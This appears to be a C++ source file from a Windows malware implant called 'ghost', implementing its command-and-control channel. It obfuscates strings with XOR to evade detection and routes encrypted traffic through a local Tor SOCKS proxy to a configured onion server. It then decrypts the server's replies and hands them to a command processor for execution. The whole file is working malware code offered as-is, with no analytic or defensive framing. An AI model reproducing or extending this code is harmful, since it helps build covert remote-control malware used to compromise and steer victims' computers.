#include "c2.h"
#include "../core/ghost_core.h"
#include "../core/config.h"
#include "../crypto/crypto.h"

#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>

#include <vector>
#include <string>
#include <chrono>
#include <thread>
#include <cstring>

#pragma comment(lib, "ws2_32.lib")

namespace ghost {
namespace c2 {

namespace {

    template <size_t N>
    class ObfuscatedAString {
        char m_data[N];
        char m_key;
    public:
        constexpr ObfuscatedAString(const char (&str)[N], char key) : m_data{0}, m_key(key) {
            for (size_t i = 0; i < N; ++i) m_data[i] = str[i] ^ key;
        }
        std::string decrypt() const {
            std::string result(N - 1, '\0');
            for (size_t i = 0; i < N - 1; ++i) result[i] = m_data[i] ^ m_key;
            return result;
        }
    };
    #define OBF_A(str) ObfuscatedAString<sizeof(str)/sizeof(char)>(str, 'K').decrypt()


    constexpr uint8_t SOCKS_VERSION      = 5;
    constexpr uint8_t AUTH_METHOD_NOAUTH = 0x00;
    constexpr uint8_t CMD_CONNECT        = 0x01;
    constexpr uint8_t ATYP_DOMAINNAME    = 0x03;
    constexpr uint8_t REP_SUCCESS        = 0x00;

    constexpr int SOCKET_TIMEOUT_MS = 5000;
    constexpr size_t MAX_HOST_LEN   = 255;

    static const uint16_t TOR_PORTS[] = {9050, 9150};
    static const size_t TOR_PORT_COUNT = sizeof(TOR_PORTS) / sizeof(TOR_PORTS[0]);

    bool SendAll(SOCKET sock, const uint8_t* data, size_t len) {
        size_t total = 0;
        while (total < len) {
            int sent = send(sock, reinterpret_cast<const char*>(data + total), static_cast<int>(len - total), 0);
            if (sent <= 0) return false;
            total += sent;
        }
        return true;
    }

    int RecvSome(SOCKET sock, uint8_t* buf, size_t len) {
        return recv(sock, reinterpret_cast<char*>(buf), static_cast<int>(len), 0);
    }

    void SetSocketTimeout(SOCKET sock) {
        DWORD timeout = SOCKET_TIMEOUT_MS;
        setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout, sizeof(timeout));
        setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (char*)&timeout, sizeof(timeout));
    }

    SOCKET ConnectToLocalSocks(uint16_t& used_port) {
        for (size_t i = 0; i < TOR_PORT_COUNT; ++i) {

            SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
            if (sock == INVALID_SOCKET) continue;

            SetSocketTimeout(sock);

            sockaddr_in addr{};
            addr.sin_family = AF_INET;
            addr.sin_port   = htons(TOR_PORTS[i]);

            std::string localhost = OBF_A("127.0.0.1");
            inet_pton(AF_INET, localhost.c_str(), &addr.sin_addr);

            if (connect(sock, (sockaddr*)&addr, sizeof(addr)) == 0) {
                used_port = TOR_PORTS[i];
                return sock;
            }

            closesocket(sock);
        }

        return INVALID_SOCKET;
    }

    bool PerformSocksHandshake(SOCKET sock, const std::string& onion_host, uint16_t target_port) {

        if (onion_host.length() > MAX_HOST_LEN) {
            return false;
        }

        uint8_t buf[512];

        uint8_t auth_req[] = {
            SOCKS_VERSION,
            1,
            AUTH_METHOD_NOAUTH
        };

        if (!SendAll(sock, auth_req, sizeof(auth_req))) {
            return false;
        }

        if (RecvSome(sock, buf, 2) != 2 ||
            buf[0] != SOCKS_VERSION ||
            buf[1] != AUTH_METHOD_NOAUTH) {
            return false;
        }

        size_t pos = 0;

        buf[pos++] = SOCKS_VERSION;
        buf[pos++] = CMD_CONNECT;
        buf[pos++] = 0x00;
        buf[pos++] = ATYP_DOMAINNAME;
        buf[pos++] = static_cast<uint8_t>(onion_host.length());

        std::memcpy(buf + pos, onion_host.data(), onion_host.length());
        pos += onion_host.length();

        uint16_t port_be = htons(target_port);
        std::memcpy(buf + pos, &port_be, 2);
        pos += 2;

        if (!SendAll(sock, buf, pos)) {
            return false;
        }

        int recv_len = RecvSome(sock, buf, sizeof(buf));
        if (recv_len < 4 ||
            buf[0] != SOCKS_VERSION ||
            buf[1] != REP_SUCCESS) {
            return false;
        }

        return true;
    }

} 

bool SendTOR(const uint8_t* data, size_t len) {

    if (!data || len == 0) return false;

    std::vector<uint8_t> encrypted;
    if (!crypto::Encrypt(data, len, encrypted)) {
#ifdef _DEBUG
        OutputDebugStringA(OBF_A("[C2] Encrypt failed\n").c_str());
#endif
        return false;
    }

    uint16_t tor_port = 0;
    SOCKET sock = ConnectToLocalSocks(tor_port);

    if (sock == INVALID_SOCKET) {
#ifdef _DEBUG
        OutputDebugStringA(OBF_A("[C2] Failed to connect to TOR SOCKS\n").c_str());
#endif
        return false;
    }

    bool success = false;

    do {
        std::string onion = config::C2_TOR_ONION;
        if (!PerformSocksHandshake(sock, onion, 80)) {
#ifdef _DEBUG
            OutputDebugStringA(OBF_A("[C2] SOCKS handshake failed\n").c_str());
#endif
            break;
        }

        if (!SendAll(sock, encrypted.data(), encrypted.size())) {
#ifdef _DEBUG
            OutputDebugStringA(OBF_A("[C2] Send failed\n").c_str());
#endif
            break;
        }

        uint8_t recv_buf[4096];
        int recv_len = RecvSome(sock, recv_buf, sizeof(recv_buf));

        if (recv_len <= 0) {
#ifdef _DEBUG
            OutputDebugStringA(OBF_A("[C2] No response\n").c_str());
#endif
            break;
        }

        std::vector<uint8_t> decrypted;
        if (!crypto::Decrypt(recv_buf, recv_len, decrypted)) {
#ifdef _DEBUG
            OutputDebugStringA(OBF_A("[C2] Decrypt failed\n").c_str());
#endif
            break;
        }

        ProcessCommand(decrypted.data(), decrypted.size());

        success = true;

    } while (false);

    closesocket(sock);
    return success;
}

} 
}